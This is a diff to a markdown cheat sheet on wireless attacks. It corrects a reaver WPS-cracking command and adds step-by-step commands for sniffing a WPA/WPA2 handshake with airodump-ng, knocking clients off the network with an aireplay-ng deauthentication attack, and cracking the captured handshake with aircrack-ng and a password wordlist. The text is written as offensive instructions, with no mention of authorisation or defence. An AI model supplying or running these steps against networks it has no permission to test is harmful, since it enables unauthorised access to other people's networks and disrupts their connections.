@@ -82,10 +82,27 @@ ___
 
 - First, run reaver WPS cracker utilzing the command 
 
-   `reaver --bssid <Network MAC? --channel <channel #> --interface <device name> -vvv --no-associate`
+   `reaver --bssid <Network MAC> --channel <channel #> --interface <device name> -vvv --no-associate`
 
 - next, associate your device to the network utilizing above command
 
 ___
 
+### Capturing a WPA/WPA2 Handshake
 
+- First, start packet sniffing a specific network utilizing the command
+   `airodump-ng --bssid <router MAC Address> --channel <channel number> --write <write file> <device name>`
+
+- Next, run a deauthentication attack on a particular device utilizing the command
+   `aireplay-ng --deauth <# of packets> -a <Router MAC> -c <Client MAC> <device name>`
+
+___
+
+### Cracking a WPA/WPA2 handshake with a wordlist Attack
+
+- First, utilize the above section to capture a handshake.
+
+- Next, ensure you have a large word list, github has large common password files
+
+- Lastly, we need to utilize aircrack-ng to try and crack the handshake against the password file
+   `aircrack-ng <handshake capture file .cap> -w <password txt file>`
